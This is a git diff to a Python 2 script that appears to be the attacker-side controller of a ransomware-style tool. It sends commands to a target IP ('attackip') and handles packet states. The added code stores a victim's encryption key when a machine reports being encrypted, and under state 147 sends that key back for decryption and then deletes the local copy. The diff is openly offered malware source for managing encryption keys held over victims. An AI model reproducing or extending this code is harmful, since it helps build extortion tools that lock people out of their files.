@@ -5,6 +5,7 @@ from PIL import Image
 from StringIO import StringIO
 import threading, time
 from packet import Packet
+import os
 
 def signal_handler(signal, frame):
         print('You pressed Ctrl+C!')
@@ -16,6 +17,15 @@ def send(client):
     pkt = Packet()
     pkt.toIP = attackip
     pkt.state = cmd
+    if pkt.state == "147":
+        base = "C:\Users\Matt\Desktop\\testfolder"
+        path = base + "\\" + pkt.toIP + "-encryptionkey"
+        try:
+            f = open(path,"rb")
+            pkt.data = f.read()
+            pkt.length = len(pkt.data)
+        except:
+            print "no encryption key found"
     pkt.send(client)
 
 def receive(s):
@@ -42,6 +52,19 @@ def receive(s):
             f = open(path,"w")
             f.write(pkt.data)
             f.close()
+        elif pkt.state == "146":
+            if pkt.data != "already encrypted":
+                path = base + "\\" + pkt.toIP + "-encryptionkey"
+                f = open(path,"w")
+                f.write(pkt.data)
+                f.close()
+            else: 
+                print pkt.data
+        elif pkt.state == "147":
+            print pkt.data
+            if pkt.data == "There you go! Sorry about that.":
+                path = base + "\\" + pkt.toIP + "-encryptionkey"
+                os.unlink(path)
         else:
             print "don't know that one"
 
